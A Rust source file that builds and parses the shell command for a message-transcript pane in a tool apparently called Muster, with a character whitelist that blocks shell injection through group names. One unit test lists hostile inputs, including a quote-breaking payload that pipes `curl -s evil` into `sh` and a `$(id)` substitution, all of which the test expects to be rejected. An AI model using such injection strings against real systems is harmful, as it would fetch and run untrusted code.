//! A group's transcript: the pane a notification of a message for the human lands on (MIP-4,
//! section 10). It is an ordinary pane running `muster msg log --follow`, so a window finds one
//! by the command it runs, which the pane's daemon keeps, rather than by a record of its own
//! that could disagree with what is on screen.

const BEFORE: &str = "muster msg log --group='";
const AFTER: &str = "' --follow";

/// The longest group name a daemon keeps (250 bytes), with `@` and a machine's name (64).
const LONGEST: usize = 250 + 1 + 64;

/// Whether `name` can be a group's name as a daemon gives it: a name joined by `+`, perhaps with
/// `@machine`. Anything else came from a daemon that should not have sent it.
///
/// None of these characters means anything inside single quotes to sh, bash, zsh or fish, which
/// is what lets the name reach a shell's command line at all: the group is named by whichever
/// machine keeps it, which is not always this one.
pub fn is_group(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= LONGEST
        && name
            .chars()
            .all(|character| character.is_ascii_alphanumeric() || "._-+@".contains(character))
}

/// What a transcript of `group` runs, or nothing for a name that is not a group's. `=` rather
/// than a space, because a name may start with `-`.
pub fn command(group: &str) -> Option<String> {
    is_group(group).then(|| format!("{BEFORE}{group}{AFTER}"))
}

/// The group a pane running `command` is the transcript of, if it is one.
pub fn group_of(command: &str) -> Option<&str> {
    command.strip_prefix(BEFORE)?.strip_suffix(AFTER).filter(|group| is_group(group))
}

/// What a transcript's pane is called when Muster makes one.
pub fn pane_name(group: &str) -> String {
    format!("✉ {group}")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_transcript_is_known_by_the_command_it_runs() {
        for group in ["review", "@human+builder", "review@devenv", "-x"] {
            let command = command(group).expect("a group's name");
            assert_eq!(group_of(&command), Some(group));
        }
        assert_eq!(command("-x").as_deref(), Some("muster msg log --group='-x' --follow"));
        assert_eq!(group_of("muster msg log --group='review'"), None);
        assert_eq!(group_of("claude"), None);
    }

    #[test]
    fn a_name_a_shell_would_read_as_code_has_no_transcript() {
        for name in ["x'; curl -s evil | sh; '", "a\nb", "a b", "a\\b", "$(id)", "", "a;b"] {
            assert_eq!(command(name), None, "{name:?}");
        }
        assert_eq!(command(&"a".repeat(LONGEST + 1)), None);
    }
}
